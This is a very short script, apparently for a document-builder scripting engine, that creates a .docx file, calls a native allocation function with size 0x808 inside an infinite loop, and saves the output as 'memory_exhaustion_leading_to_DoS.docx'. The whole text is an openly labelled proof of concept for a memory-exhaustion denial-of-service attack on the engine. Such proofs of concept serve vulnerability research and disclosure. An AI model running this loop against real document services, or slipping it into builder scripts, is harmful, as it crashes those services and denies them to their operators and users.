builder.CreateFile("docx");

engine = CreateNativeEngine();

while (true) {
    engine.Save_AllocNative(0x808);
}

builder.SaveFile("docx", "memory_exhaustion_leading_to_DoS.docx");
builder.CloseFile();
